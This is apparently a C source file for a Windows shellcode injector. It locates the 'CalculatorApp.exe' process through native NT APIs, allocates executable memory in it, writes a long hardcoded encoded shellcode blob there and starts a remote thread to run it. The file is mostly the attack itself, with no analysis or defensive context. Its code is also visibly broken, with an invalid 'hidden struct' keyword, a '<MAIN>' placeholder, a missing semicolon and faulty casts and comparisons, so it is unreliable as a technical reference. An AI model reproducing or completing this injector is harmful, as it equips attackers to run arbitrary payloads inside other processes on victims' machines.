
// Define necessary structures and types

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

hidden struct _SYSTEM_PROCESS_INFORMATION {
  ULONG NextEntryOffset; 
  ULONG NumberOfThreads;
  LARGE_INTEGER WorkingSetPrivateSize;
  ULONG HardFaultCount;
  ULONG NumberOfThreadsHighWatermark;
  ULONGLONG CycleTime;
  LARGE_INTEGER CreateTime;
  LARGE_INTEGER UserTime;
  LARGE_INTEGER KernelTime;
  UNICODE_STRING ImageName;
  KPRIORITY BasePriority;
  HANDLE UniqueProcessId;
  HANDLE InheritedFromUniqueProcessId;
  ULONG HandleCount;
  ULONG SessionId;
  ULONG_PTR UniqueProcessKey;
  SIZE_T PeakVirtualSize;
  SIZE_T VirtualSize;
  ULONG PageFaultCount;
  SIZE_T PeakWorkingSetSize;
  SIZE_T WorkingSetSize;
  SIZE_T QuotaPeakPagedPoolUsage;
  SIZE_T QuotaPagedPoolUsage;
  SIZE_T QuotaPeakNonPagedPoolUsage;
  SIZE_T QuotaNonPagedPoolUsage;
  SIZE_T PagefileUsage;
  SIZE_T PeakPagefileUsage;
  SIZE_T PrivatePageCount;
  LARGE_INTEGER ReadOperationCount;
  LARGE_INTEGER WriteOperationCount;
  LARGE_INTEGER OtherOperationCount;
  LARGE_INTEGER ReadTransferCount;
  LARGE_INTEGER WriteTransferCount;
  LARGE_INTEGER OtherTransferCount;
} SYSTEM_PROCESS_INFORMATION;


typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;


typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;



<MAIN>
{

	UNICODE_STRING NtImagePath;
    CLIENT_ID clientId = NULL;
	OBJECT_ATTRIBUTES ObjectAttributes = { 0 };
    clientId.UniqueThread = NULL;
	ObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES); 
	PVOID BaseAddress = NULL;
	ULONG NumberOfBytesWritten = 0;
	SIZE_T RegionSize = 0x2000;
	DWORD p = NULL;
	DWORD ZeroBits = 0;
	DWORD dwRet = NULL;
	NTSTATUS dwStatus = NULL;
	DWORD SystemProcessInformation = 0x5;
	DWORD nextEntry = 0;
	DWORD imageName = 0;
	DWORD newBaseAddress = 0;
	DWORD processId = 0;
	PVOID shellcode = "\x49\xb8\xc1\xe6\x42\x14\xe1\x81\x76\x8d\x54\x5e\x66\x81\xe6\x20\xf7\x48\x31\xdb\xdb\xc9\x48\x0f\xae\x06\xb3\x7e\x48\x8b\x7e\x08\x48\xff\xcb\x4c\x31\x44\xdf\x19\x48\x85\xdb\x75\xf3\x89\x6f\xa3\x5c\xd0\x7e\xad\x43\xa7\x67\xa3\x94\x1b\xc9\x79\x23\xc0\xaf\xff\x4f\x61\x00\xcb\x9e\xeb\xd8\x5d\x54\x56\xf9\x3e\x06\x90\xee\x0a\xeb\x2e\xcd\x47\xe1\x3b\xcf\x0a\x91\x1e\xf4\x85\x9f\xc8\x85\xb7\x36\x19\x64\xbd\x64\x33\x01\xbe\x86\x29\xdf\x91\x9f\x4e\xc9\xfd\x4f\x72\xaf\x67\x25\x55\x48\x6f\x61\x6d\xf2\xe2\x94\x49\x2f\x00\xcd\x82\x8e\x25\x06\x68\x2f\x7a\xd5\xbe\x4c\x2d\x02\x7f\x3e\xe1\x45\xec\x40\x1f\x99\x33\x92\x90\x6b\xe4\xa6\x3a\x72\x3f\x5f\x77\x5b\x93\x0a\x30\xd7\x1c\x72\x91\x25\xc1\x50\xf2\xa1\xba\x3a\x2f\x5d\xe3\x28\x05\x0f\x9d\x3e\x55\x45\xd8\xea\x72\x43\xc0\x0b\x2f\x82\x65\x43\x80\xd3\x21\x85\xb9\x6f\x77\x30\x0f\x14\x1a\xff\x8e\x13\x9c\xa4\x3a\x32\x88\x39\x3b\xd0\xf3\x02\x72\x8d\xf0\x12\x46\x0f\x6f\x22\x72\xf7\xc0\x2a\x84\xb2\xbc\x0b\xa0\x19\x06\xa7\x0b\x47\xa1\xf2\xce\x05\x5c\xf8\x1b\xd9\xeb\x51\x13\xd6\x20\x2d\x4d\x54\x8a\x63\x94\x0e\x58\xa2\x4a\xb2\x06\xdf\xbc\xb9\x10\x29\x73\x96\x54\xfb\xbc\xc3\x00\x10\xb1\x9e\x9e\x07\xff\x48\xa5\x7c\xd4\x8c\xc9\x6b\x54\xc1\xba\xe6\xad\x9f\x10\x71\x6a\x05\x70\x7f\xa9\xbd\xcb\xa2\xb8\x6f\x45\x74\xea\x95\xa7\xa2\x48\x0c\x0a\x0d\x1d\x3e\x8e\xa2\x32\x2c\x33\xcf\x06\x43\xe8\x38\x04\xe1\xe1\x58\xfa\x0b\x2a\x8d\xb5\x59\x7f\x09\xac\x43\x5a\x0e\x91\x41\xa6\x0a\x9a\x43\xe0\x8e\xec\x41\xa6\x0a\xda\x46\x5a\x15\xbc\x06\x9a\x12\xb0\x43\xe0\xae\xa4\x41\x1c\x98\x56\x37\x0a\xa0\xf6\x25\x0d\x19\x3b\xc2\x66\x9d\xf5\xc8\xcf\xb5\xa8\x4a\x3a\x94\x7f\x5b\x0d\xd3\xb8\x37\x23\xdd\x24\x6f\xac\x20\xe2\x00\x69\xd3\x71\x7b\x2d\x58\xfa\x80\xeb\x54\xf4\x09\x2d\x10\x7f\xcb\x1f\xbb\xbc\x08\xfd\xd3\xb2\x13\x2f\x57\xb4\x29\x64\x59\x2a\x5b\x88\x8a\xbc\xf6\xe4\x19\x71\x3f\xe3\x94\xf5\xdf\x60\x69\x33\x43\x5a\x1c\xb5\xc8\xe4\x55\x56\x4a\x6a\x1d\xcc\xe9\x58\xa9\xb6\x08\x27\xf8\xfc\x4c\x14\x89\x8f\xd3\x33\x98\x7f\x49\x09\x11\xfb\xdb\x0d\x9d\x7f\x05\x65\x1c\x71\x4b\x77\x95\xf5\xd9\x6c\xd3\xfe\x83\x23\xdd\x24\x48\x75\x19\xa2\x55\x32\x86\xb5\x51\x6c\x01\xbb\x51\x23\x5f\x18\x29\x6c\x0a\x05\xeb\x33\x9d\xad\x53\x65\xd3\xe8\xe2\x20\x23\x0b\xf6\x70\x10\xcb\xd0\x38\x95\x4a\x7e\x44\x36\x93\x65\x0e\xa8\xf4\x48\x7b\x10\x73\xea\x22\x1b\x36\x45\x5a\x7e\xfd\xf4\xbe\x8f\xa7\xe1\x5a\x58\xfa\x0b\x26\xb3\x8e\x60\x41\x34\x9b\x24\x5e\xf2\xc4\x29\x05\x15\x9b\x68\x02\xb2\x80\x66\x5e\x30\xc1\x2b\x22\xb2\x80\x6c\x41\x78\xb7\x6a\x08\xfc\xbb\x5a\x0d\x00\xda\x3a\x5f\x83\xc3\x56\x1f\x71\xda\x4a\x1b\xac\x98\x6c\x7a\x3d\x98\x40\x02\xa8\xdb\x3f\x1d\x6d\xd4\x3a\x45\xed\xc1\x29\x05\x13\xb2\x5f\x26\x90\xd8\x29\x41\x31\x91\x6e\x4b\x9b\x91\x6a\x46\x37\xd3\x2b\x3d\xb9\x86\x7a\x44\x37\x94\x24\x5a\xeb\xda\x3d\x03\x69\xda\x58\x0a\xba\x95\x7b\x44\x77\xcc\x3b\x5e\xf2\xc5\x27\x1c\x6d\xfa\x52\x38\x86\xb9\x38\xed\x15\xcb\xc2\x38\x8f\xbd\xb3\x17\x0e\x83\xac\x6b\xdc\xf4\x09\xd2\x8d\x12\x00\x6b\xdc\xf4\x38\x1d\x76\xca\x25\x5b\xf2\xc5\x3b\x15\x58\xa0\x43\xe2\x1d\xbd\xce\xed\xa3\xda\x0b\x6b\x91\xc5\xc0\x7e\x0b\x90\x08\x38\x95\x4e\x5e\xa4\xc7\x3c\x0b\x6b\xdc\xf4\xf6\xf8\xb0\xd5\x0b\x6b\xdc\xdb\x5e\x48\x1d\x82\x66\x27\xb0\xc4\x38\x59\x1f\x80\x7d\x5c\x97\xcd\x3b\x14\x2b\x9b\x69\x1c\xb3\x92\x62\x48\x68\xac\x5d\x3f\xbb\xc6\x5b\x4e\x0a\x91\x73\x0e\xa8\xb5\x45\x64\x61\xae\x40\x6b\x94\x7d\xc8\x7e\x02\xbb\x53\x26\xed\x3d\x5a\x65\xe0\xfa\x39\xc3\x58\xf4\x09\x2d\x58\xaa\x58\x38\x95\x33\xcb\xc6\x0d\xd4\x30\x94\x09\xbc\x80\xeb\x32\xf0\x54\x23\x55\x05\x63\x32\x02\xa8\x63\xeb\xef\xf4\x09\x64\xd1\x1a\x61\x6f\x9d\xad\x40\x97\x2d\xbc\x95\xed\xdc\xf4\x09\x2d\xa7\x2f\x46\x5a\x1c\xa7\x53\x65\xd1\x0b\x46\x5a\x15\xb9\x38\xe4\x0b\xa9\x42\xac\x1e\xd9\x0f\x35\x23\x05\xde\xee\x1c\x81\x16\x65\x9f\x3b\x83\x78\xdc\xf4\x40\x97\x1c\x0a\x3e\x8b\xdc\xf4\x09\x2d\xa7\x2f\x43\x94\x13\x80\x0b\xc6\xf2\x12\x5e\x6b\xdc\xf4\x5a\x74\x32\xba\x51\x22\x55\x25\xc8\xcf\x48\xb3\xcc\xab\xdc\xe4\x09\x2d\x11\x40\x53\xcf\x8f\x11\x09\x2d\x58\xfa\xf4\xbe\x94\x67\x5a\x7e\x10\x73\xec\x23\x55\x05\x41\xa4\x82\xb3\xcc\xab\xdc\xd4\x09\x2d\x11\x73\xf2\x22\x66\xe6\x9f\xa4\xba\xfa\x0b\x6b\xdc\x0b\xdc\x65\xdb\x3e\x2b\xee\x1c\x80\xbb\x4b\xd3\xfd\x43\x6a\x1f\x71\xc9\x58\x8a\xa2\xc8\x33\xb6\xf4\x50\x64\x9f\x38\xfb\xde\x7e\xa2\xf6\xf8\x7f\xfa\xc3\x20\x9d\x2e\x1c"; 
	while(TRUE){
	  NtAllocateVirtualMemory(GetCurrentProcess(), &BaseAddress, ZeroBits, &RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
	  dwStatus = NtQuerySystemInformation(SystemProcessInformation, BaseAddress, RegionSize, &dwRet);
	  if (dwStatus == 0)
	  {
		break;
	  }
	  dwRet += 0x2000;
	  RegionSize = dwRet;
	  BaseAddress = 0;
	}
	
	newBaseAddress = BaseAddress;
	while(TRUE){
	nextEntry = (SYSTEM_PROCESS_INFORMATION)newBaseAddress->NextEntryOffset;
	if (nextEntry == 0)
	{
		break;
	}
	newBaseAddress += nextEntry;
	imageName = (SYSTEM_PROCESS_INFORMATION)newBaseAddress->ImageName->Buffer;
    InitUnicodeStr(NtImagePath, "CalculatorApp.exe");
	if (imageName == NtImagePath)
	{
		processId = (SYSTEM_PROCESS_INFORMATION)newBaseAddress->UniqueProcessId;
		break;
	}
	}
	HANDLE hProcess = NULL;
	CLIENT_ID ClientId;
	ClientId.UniqueProcess = processId;
	NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &ObjectAttributes, &ClientId);
	BaseAddress = 0;
	NtAllocateVirtualMemory(hProcess, &BaseAddress, ZeroBits, &RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	ULONG NumberOfBytesToWrite = sizeof(shellcode);
	NtWriteVirtualMemory(hProcess, BaseAddress, shellcode, NumberOfBytesToWrite, &NumberOfBytesWritten);
	HANDLE ThreadHandle = NULL;
	NtCreateThreadEx(&ThreadHandle, 0x1FFFFF, NULL, hProcess, BaseAddress, NULL, NULL, NULL, NULL, NULL, NULL);
	
	}

}
